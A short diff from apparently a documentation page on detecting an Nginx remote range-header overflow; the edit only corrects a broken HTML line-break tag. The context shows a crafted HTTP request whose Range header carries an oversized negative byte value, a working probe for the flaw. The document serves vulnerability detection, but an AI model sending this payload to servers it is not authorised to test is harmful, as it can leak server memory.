@@ -11,7 +11,7 @@ The response code for detecting Nginx Remote Overflow is 206 and Partial Content
 
  GET /domain HTTP/1.1<br/>
  Accept-Encoding: identity<br/>
- Range: bytes=-17208,-9223372036854758792<b/r>
+ Range: bytes=-17208,-9223372036854758792<br/>
  Host: 127.0.0.1:8000<br/>
  Connection: close<br/>
  User-Agent: Python-urllib/2.7<br/>
